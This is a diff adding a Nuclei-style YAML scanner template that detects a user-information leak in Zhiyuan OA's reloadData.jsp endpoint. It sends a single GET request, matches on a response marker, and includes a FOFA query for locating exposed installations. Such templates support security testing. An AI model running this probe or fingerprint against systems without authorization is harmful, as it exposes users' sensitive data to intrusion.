@@ -1,0 +1,29 @@
+id: zhiyuan-oa-reloadData-leak
+
+info:
+  name: reloadData.jsp 用户敏感信息泄露漏洞
+  author: xiaohe
+  severity: high
+  description: reloadData.jsp 用户敏感信息泄露漏洞
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247485029&idx=1&sn=1bbe24fd063d75e35a4d24db5e8edd0f
+  metadata:
+    verified: true
+    fofa: body="yyoa" && app="致远互联-OA""
+  tags: zhiyuan,leak
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/common/SelectPerson/reloadData.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'insertObject'
+      
+      - type: status
+        status:
+          - 200
